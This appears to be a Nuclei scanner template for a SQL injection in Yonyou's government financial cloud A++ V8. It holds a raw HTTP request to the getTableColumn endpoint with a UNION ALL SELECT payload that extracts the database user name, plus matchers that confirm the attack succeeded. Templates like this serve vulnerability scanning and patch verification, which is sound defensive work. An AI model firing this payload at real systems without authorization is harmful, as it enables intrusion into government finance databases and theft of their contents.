id: yonyou-grp-a-cloud-getTableColumn-sqli
info:
  name: 用友政务财务云A++V8_getTableColumn_sql注入
  author: leadlife
  severity: high
  description: 用友政务财务云A++V8_getTableColumn_sql注入，攻击者可进行sql注入攻击获取数据库信息或者权限。
  reference: 
    - https://github.com/SourByte05/Vulnerability-Wiki-PoC/blob/main/2026/07/%E7%94%A8%E5%8F%8B%E6%94%BF%E5%8A%A1%E8%B4%A2%E5%8A%A1%E4%BA%91A%2B%2BV8_getTableColumn_sql%E6%B3%A8%E5%85%A5/%E7%94%A8%E5%8F%8B%E6%94%BF%E5%8A%A1%E8%B4%A2%E5%8A%A1%E4%BA%91A%2B%2BV8_getTableColumn_sql%E6%B3%A8%E5%85%A5.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    version:
  tags: yonyou,sqli,grpacloud

http:
  - raw:
      - |
        GET /lp/gwzjConfig/getTableColumn?view=LP_PAYFILES_INFO'+UNION+ALL+SELECT+CHR(123)||user||CHR(126)+FROM+DUAL-- HTTP/1.1
        Host: {{Hostname}}
        Connection: keep-alive
        sec-ch-ua-platform: "Windows"
        X-Requested-With: XMLHttpRequest
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
        Accept: application/json, text/javascript, */*; q=0.01
        sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
        sec-ch-ua-mobile: ?0
        Sec-Fetch-Site: same-origin
        Sec-Fetch-Mode: cors
        Sec-Fetch-Dest: empty
        Accept-Encoding: gzip, deflate, br, zstd
        Accept-Language: zh-CN,zh;q=0.9
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'获取列数据成功')
        condition: and